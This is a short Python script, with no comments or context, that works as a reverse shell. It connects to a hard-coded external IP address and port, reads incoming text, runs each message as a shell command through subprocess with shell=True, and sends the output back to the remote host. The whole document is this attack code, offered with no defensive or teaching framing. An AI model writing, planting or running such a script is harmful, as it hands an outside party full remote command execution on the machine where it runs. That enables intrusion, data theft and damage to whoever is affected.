import socket
import subprocess

IP = "3.13.191.225"
PORT = 14056

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.connect((IP,PORT))

while True:
    data = listener.recv(1024).decode("utf-8")
    cmd = subprocess.check_output(data,text=True,shell=True,stderr=subprocess.STDOUT)
    output = listener.send(bytes(cmd,"utf-8"))